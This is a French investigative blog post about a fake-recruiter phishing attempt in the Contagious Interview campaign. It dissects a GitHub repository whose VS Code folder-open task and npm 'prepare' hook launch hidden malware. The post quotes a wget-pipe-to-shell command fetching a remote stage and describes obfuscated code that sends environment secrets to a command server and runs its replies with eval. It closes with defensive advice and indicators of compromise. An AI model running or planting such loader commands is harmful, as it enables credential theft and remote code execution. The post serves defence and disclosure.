---
Title:   "Anatomie d'une tentative d'hameçonnage"
Date:    2026-09-10T09:00:00+02:00
Tags:    [ "sécurité", "hameçonnage", "github", "npm", "linkedin", "identité" ]
categories: [ "Study" ]
draft: true
author: [ "Mnêmê" ]
description: "Un contact LinkedIn, une visioconférence, et au bout de cinq minutes un dépôt GitHub à cloner puis un « npm install » à lancer. Récit d'une approche de la campagne Contagious Interview, et les pièces pour poursuivre l'enquête."
lang: fr
bg_image: "images/backgrounds/library.jpg"
image: "images/blog/2026/altura-readme-banner.jpg"
type: "post"
---

Début septembre 2026, Jean-Jacques reçoit une sollicitation sur LinkedIn. Son
auteur se présente sous le nom de « Charlie Cook, GMS » et évoque un projet en
quête de compétences. Les détails restent flous : quelques mots-clés mal agencés
— intelligence artificielle, *blockchain*, économie de jetons décentralisée.
Plusieurs d'entre eux désignent des choses que nous construisons avec sérieux, et
Jean-Jacques est curieux : quel produit, pour quel marché, avec quelle
stratégie ? Il accepte un rendez-vous en visioconférence.

## L'appel

La visioconférence a lieu sur Google Meet. L'homme qui apparaît à l'écran ne
ressemble pas à la photo du profil qui a proposé le rendez-vous : la trentaine,
chauve, de corpulence moyenne, de type européen, parlant un anglais parfait. Il
ne se présente pas.

Au bout de cinq minutes, il transmet le lien d'un dépôt GitHub, demande à
Jean-Jacques s'il utilise VS Code, lui demande de cloner le dépôt, puis de lancer
`npm install`.

Jean-Jacques refuse d'exécuter quoi que ce soit avant d'avoir étudié le code et
le projet, et veut savoir à qui il parle et ce qu'on attend de lui :
*« Who are you? »* L'homme raccroche.

Peu après, le profil de « Charlie Cook » disparaît de LinkedIn, et la
conversation avec lui. Le site de la société dont se réclamait l'approche
disparaît à son tour. Jean-Jacques n'a pas enregistré l'appel, et le regrette.

## Ce que montrait la page GitHub

Avant même tout clone, la page du dépôt accumulait les signaux.

{{< figure
  src="/images/blog/2026/altura-github-page.png"
  link="/images/blog/2026/altura-github-page.png"
  alt="Page GitHub du dépôt Altura-Hub21/Altura-MVP : 381 commits, dossier .vscode en tête de liste, aucune étoile, aucune description"
  caption="La page du dépôt le 10 septembre 2026 : 381 commits, un dossier `.vscode` en tête de liste, ni description ni étoile."
>}}

**La bannière.** Le README s'ouvre sur une image qui empile « AI POWERED »,
« NFT » et « PLAY. EARN. OWN. EVOLVE. », au-dessus d'un texte où se succèdent
*Web3*, *AI*, *blockchain*, *Play-to-Earn*, *NFT avatars* et *decentralized token
economy*. Plus bas : « Staking • Sports Betting • Roulette • Lottery • Slot
Game ». Aucun produit n'est décrit. Le fichier n'a même pas été renommé : son
texte alternatif est `ChatGPT Image Aug 26, 2026, 11_49_18 AM`, et le manifeste
C2PA qu'il embarque désigne le générateur `gpt-image` 2.0 et une origine
`trainedAlgorithmicMedia`. Générée à 11 h 49 selon son nom, l'image a été
insérée dans le dépôt à 11 h 52 le même jour.

{{< figure
  src="/images/blog/2026/altura-readme-banner.jpg"
  link="/images/blog/2026/altura-readme-banner.jpg"
  alt="Bannière du README : AI POWERED, NFT, ALTURA, PLAY. EARN. OWN. EVOLVE."
  caption="La bannière du README, générée par ChatGPT le 26 août 2026 d'après son propre manifeste C2PA."
>}}

**Le compte.** `Altura-Hub21` a été créé le 20 août 2026 : un seul dépôt, aucun
abonné, un profil vide. Le dépôt date du 7 septembre à 14 h 44, son dernier
envoi de 14 h 54.

**L'historique.** Les « 381 Commits » donnent une impression de sérieux. Les plus
anciens remontent pourtant à juillet 2015 et appartiennent à un projet libre sans
rapport, sur lequel on a greffé un jeu de poker, puis la charge. Les derniers
envois proviennent d'une série d'adresses jetables, dont deux contiennent le mot
`interview`.

**Le nom.** Un dépôt identique, `Altura-Hub/Altura-MVP`, avait été
[signalé sur le forum de GitHub](https://github.com/orgs/community/discussions/206577)
puis supprimé. Il est revenu avec un « 21 » de plus.

## Ce que cachait le dépôt

Nous avons lu le dépôt sans rien exécuter : un clone en miroir, sans copie de
travail, dont chaque fichier a été extrait avec `git show`. Deux portes y
attendaient, une pour chaque réponse à la question « utilisez-vous VS Code ? ».

### Avec VS Code : `.vscode/tasks.json`

Deux tâches marquées `"runOn": "folderOpen"`, que l'éditeur lance à l'ouverture
du dossier. La première exécute `npm install`. La seconde télécharge un script et
le confie au shell :

```text
"linux": {   [plusieurs centaines d'espaces]   "command": "wget -qO- 'https://earniverse-mvp.vercel.app/api/settings/linux' | sh"
```

Les espaces repoussent la commande hors de l'écran, sur GitHub comme dans un
éditeur. Les réglages d'affichage (`"reveal": "silent"`, `"echo": false`,
`"close": true`) font le reste : aucun terminal n'apparaît.

Le script que sert cette adresse — récupéré le 10 septembre 2026, jamais
exécuté — tient en quatorze lignes. Il affiche « Authenticated », télécharge un
second script qu'il range sous `~/.vscode/vscode-bootstrap.sh`, dans un
répertoire que possède déjà tout utilisateur de VS Code, le lance en tâche de
fond avec `nohup`, et efface le terminal après chaque étape.

Ces scripts ne sont servis qu'aux clients en ligne de commande. Quand nous avons
demandé à la Wayback Machine d'archiver l'étage suivant, le serveur lui a
répondu `403`, avec une page à l'enseigne d'une « Celestium Exchange » qui
annonce un filtrage par adresse IP et par agent utilisateur, et n'accepte que
les « curl / terminal-based requests ». Un service d'archivage ou d'analyse en
ligne risque donc de ne voir qu'une porte fermée.

Récupéré ensuite par le réseau Tor, cet étage suivant est un script shell de
268 lignes qui prépare et lance la charge proprement dite :

1. il se relance aussitôt en arrière-plan, pour rendre la main au terminal ;
2. si Node.js 22 à 24 manque, il télécharge la version officielle depuis
   nodejs.org et l'installe dans `~/.vscode/` ;
3. il télécharge depuis le même serveur un fichier `sam.js` et un
   `package.json`, installe leurs dépendances avec `npm`, puis exécute `sam.js`.

Nous nous sommes arrêtés là : `sam.js`, la charge elle-même, n'a pas été
téléchargé.

VS Code ne lance ces tâches qu'avec l'accord de l'utilisateur : dossier approuvé,
tâches automatiques autorisées. Il faut donc que la victime clique — et c'est à
cela que sert un interlocuteur en direct.

### Sans VS Code : `npm install`

Le `package.json` déclare :

```json
"prepare": "start /b node server || nohup node server &"
```

`npm install` exécute le script `prepare`, qui démarre le serveur du projet en
tâche de fond. Ce serveur charge ses routes, dont `routes/api/auth.js`. À la fin
de ce fichier, sur la même ligne que `module.exports = router;` et derrière
plusieurs centaines d'espaces, un code obscurci qui, une fois décodé :

- relève le nom de la machine, son adresse MAC, son système, et **tout
  l'environnement du processus** (`process.env` : jetons, clés d'API,
  identifiants) ;
- les envoie toutes les cinq secondes à `http://91.121.235.127:1224/api/checkStatus` ;
- exécute par `eval` ce que renvoie le serveur quand il répond
  `status: "error"` : une exécution de code à distance déguisée en traitement
  d'erreur ;
- marque chaque requête d'une chaîne base64 qui se décode en *« now it time to
  get everything »*.

Lancer `npm install`, comme demandé, suffisait.

## PureLogics

L'approche se réclamait de la société PureLogics. Il en existe une, bien réelle :
`purelogics.com`, fondée en 2006, plusieurs centaines de salariés, installée à
Lahore. Rien ne la relie à cette affaire.

La page LinkedIn mise en avant est une autre : `purelogicsofficial`. Au nom d'une
société qui n'est pas celle-là, on a ajouté « official ». La page annonce 11 à
50 employés, 3 membres associés, une fondation en 2020, un numéro de mobile
pakistanais et le site `purelogics.co`.

L'histoire de ce domaine laisse perplexe :

| Date | Constat |
|---|---|
| avril 2023 | redirigé vers GoDaddy : le domaine est à vendre |
| fin 2024 | de nouveau en service |
| février 2025, mai 2026 | archives du Web : une page « Under Maintenance » |
| 3 septembre 2026, 23 h 48 | Jean-Jacques consulte le site : un WordPress bâti sur [Axtra](https://themeforest.net/item/axtra-digital-agency-creative-portfolio-theme/43074408), thème commercial pour agences créatives, servi en HTTPS |
| 10 septembre 2026 | page par défaut de l'hébergeur, plus aucun certificat TLS |

Le cache du navigateur de Jean-Jacques garde la trace de sa visite : 35 ressources
du thème et de ses extensions, chargées entre 23 h 47 et 23 h 48. La page
d'accueil elle-même n'y a pas été conservée.

Un seul compte reste rattaché à la page : celui d'un indépendant de Lahore,
« CEO » de PureLogics depuis avril 2023 — le mois même où le domaine était à
vendre. Rien ne le relie directement à l'approche, et nous ne le nommons pas.

Sur LinkedIn, n'importe qui peut se déclarer employé de n'importe quelle page
d'entreprise : ce rattachement ne prouve rien à lui seul. Mais un nom emprunté à
une société de plusieurs centaines de personnes et augmenté d'« official », un
numéro de mobile, un site tantôt en ligne, tantôt disparu : l'ensemble est pour
le moins louche.

## Une campagne connue

Port 1224, chemin `/api/checkStatus`, `eval` sur réponse d'erreur, second étage
hébergé chez Vercel, tâche VS Code en `folderOpen`, appât crypto et faux
recruteur : c'est la signature de la campagne *Contagious Interview*, que
[Microsoft](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/),
[Elastic](https://www.elastic.co/security-labs/threat-command/contagious-interview-malware-svg-steganography)
et [Kudelski Security](https://kudelskisecurity.com/research/how-dprks-contagious-interview-campaign-targets-developers)
attribuent à la Corée du Nord.

Ce dépôt la sert depuis au moins août 2025. Son serveur de commande a changé huit
fois entre juin et août 2026, et chaque vague a reçu sa propre application Vercel
(`vscode-settings-0511`, `vscode-settings-529`, `vscode-settings-0618`…), après
d'autres prétextes (`0g-auth-check`, `oracle-v3-nu`).

Le visage de l'appel ne correspondait pas à la photo du profil. Là non plus, rien
d'inédit : une [enquête d'Indicator](https://indicator.media/p/i-got-inside-a-north-korean-hiring-scam-what-i-found-reveals-a-troubling-shift-in-tactics)
décrit une opération nord-coréenne du même genre, qui recrutait à leur insu des
indépendants aux Philippines, au Nigeria, en Colombie et au Bangladesh pour mener
les entretiens vidéo. Une visioconférence montre un visage ; elle ne dit pas pour
qui il travaille.

## La question

Tout s'est arrêté sur un refus et une question : ne rien exécuter pendant
l'appel, pas même `npm install`, et demander à l'interlocuteur qui il était.

Rien, dans le canal choisi par l'escroc, ne pouvait répondre à sa place. Un
profil LinkedIn est déclaratif et s'efface en un clic. Une page d'entreprise
accepte tout employé qui s'y déclare. Un visage à l'écran peut appartenir à un
intermédiaire. Et les envois du dépôt n'étaient signés par personne.

C'est cette couche qui manque : une identité que d'autres ont certifiée, et des
envois signés qui y renvoient. Elle ne rend pas un code inoffensif — un escroc
sait signer. Elle rend son auteur nommable d'une plateforme à l'autre, et
comptable de ce qu'il publie.

Pendant cette enquête, Jean-Jacques a d'ailleurs lancé sans le relire un petit
programme que je lui avais envoyé pour fouiller son cache Firefox. Il savait qui
l'avait écrit, et le courriel qui le transportait était signé.

## Quelques réflexes

1. Ne rien cloner, ouvrir ni installer pendant un appel.
2. Avant d'ouvrir un dépôt, lire `.vscode/`, les scripts `preinstall`, `install`,
   `postinstall` et `prepare` du `package.json`, et l'identité des derniers
   contributeurs.
3. Désactiver les scripts d'installation par défaut :
   `npm config set ignore-scripts true`.
4. Enregistrer les profils dès le premier contact, en capture ou en page
   complète : ils disparaissent vite.
5. Demander qui est l'interlocuteur et ce qu'il attend. Un partenaire légitime
   répond.

## Éléments pour poursuivre l'enquête

Relevés le 10 septembre 2026. Les adresses électroniques sont celles que
déclarent les commits ; elles peuvent avoir été usurpées.

**Dépôts GitHub**

- `github.com/Altura-Hub21/Altura-MVP` — en ligne ; dernier commit
  `3db2431792c93882c2c4df7e336e43fe1d4765df`
- `github.com/Altura-Hub/Altura-MVP` — supprimé

**Étages suivants** — `https://<application>.vercel.app/api/settings/linux`
(et `/mac`, `/windows`)

- `earniverse-mvp`, `vscode-settings-8140-self`, `vscode-settings-0618`,
  `vscode-settings-529`, `vscode-settings-0511`
- plus anciens, en `…/api/validate?token=…` : `0g-auth-check`, `oracle-v3-nu`,
  `oracle-reg-check`
- script Linux de `earniverse-mvp` servi le 10 septembre 2026 : SHA-256
  `7cb1a0affb37850270bcf9135c56dd9e0d40f567765f100e38990c0021edc143`
- troisième étage : `https://earniverse-mvp.vercel.app/api/settings/bootstraplinux`,
  déposé sous `~/.vscode/vscode-bootstrap.sh` et lancé par `nohup`
- page de refus servie aux navigateurs et aux robots : « Celestium Exchange -
  Access Control », `HTTP 403`, `[SECURITY MODE: CLI_ONLY / IP_VALIDATION_ENABLED]`
- troisième étage servi le 10 septembre 2026 : SHA-256
  `0c0d094d6882589462a1333bb35dc363904eeb88b640f7c32e41356ea847f3eb`
- quatrième étage : `https://earniverse-mvp.vercel.app/api/settings/env`
  (enregistré sous `~/.vscode/sam.js`) et
  `https://earniverse-mvp.vercel.app/api/settings/package` (sous
  `~/.vscode/package.json`)

**Sur une machine touchée** — sous `~/.vscode/` : `vscode-bootstrap.sh`, un
Node.js portable `node-v24.11.1-<système>-<architecture>/`, `sam.js`,
`package.json` et `node_modules/`

**Serveurs de commande** — `http://<adresse>:1224/api/checkStatus`

| Adresse | Apparition dans le dépôt | Réseau (RDAP) |
|---|---|---|
| `91.121.235.127` | 27 août 2026 | OVH, France |
| `141.94.148.35` | 25 août 2026 | OVH, France |
| `141.94.148.39` | 14 août 2026 | OVH, France |
| `54.39.43.114` | 4 août 2026 | bloc client OVH |
| `167.114.215.75` | 28 juillet 2026 | bloc client OVH |
| `54.39.43.117` | 16 juillet 2026 | bloc client OVH |
| `147.124.212.207` | 22 juin 2026 | Majestic Hosting Solutions |
| `147.124.212.180` | 15 juin 2026 | Majestic Hosting Solutions |

**Adresses des commits qui portent la charge**

```text
earniverse.interview+1@gmail.com      interview.xaya.io@gmail.com
everdreamsoft2010@gmail.com           owdilqnebbrnpkeamkanibk@st.hmahs.org
griffinliamsku276@outlook.com         lxin6793@gmail.com
aaronhiroto.bm@gmail.com              coinstar@gmail.com
```

**Marqueur des requêtes** — `tid=bm93IGl0IHRpbWUgdG8gZ2V0IGV2ZXJ5dGhpbmc=`

**LinkedIn** — profil « Charlie Cook, GMS » (supprimé) ; page
`linkedin.com/company/purelogicsofficial`

**Domaine** — `purelogics.co` : `2.57.91.91`, serveurs de noms
`dns-parking.com`, messagerie `mx1.hostinger.pk`. Le 3 septembre 2026 : WordPress,
thème `axtra` (extensions `axtra-essential`, `wcf-addons`, `wcf-addons-pro`),
Elementor 4.2.2, servi en HTTP/2 sur TLS

**Bannière** — manifeste C2PA `gpt-image` 2.0, `c2pa.created` le 26 août 2026

Nous conservons l'ensemble des pièces : miroir du dépôt, captures, historique
complet. Si vous avez été approché par les mêmes profils, ou si vous poursuivez
l'enquête, [écrivez-nous](/fr/contact/).

## Sources

- [Discussion GitHub n° 206577](https://github.com/orgs/community/discussions/206577) — le premier signalement du dépôt
- [Microsoft Security Blog — *Contagious Interview: Malware delivered through fake developer job interviews*](https://www.microsoft.com/en-us/security/blog/2026/03/11/contagious-interview-malware-delivered-through-fake-developer-job-interviews/)
- [Elastic Security Labs — *New North Korean campaign uses fake coding interviews to steal developer credentials*](https://www.elastic.co/security-labs/threat-command/contagious-interview-malware-svg-steganography)
- [Kudelski Security — *How DPRK's Contagious Interview Campaign Targets Developers*](https://kudelskisecurity.com/research/how-dprks-contagious-interview-campaign-targets-developers)
- [Abstract Security — *Contagious Interview: Tracking the VS Code Tasks Vector*](https://www.abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector)
- [Indicator — *I got inside a North Korean hiring scam*](https://indicator.media/p/i-got-inside-a-north-korean-hiring-scam-what-i-found-reveals-a-troubling-shift-in-tactics)
- [VS Code — *Workspace Trust*](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust)
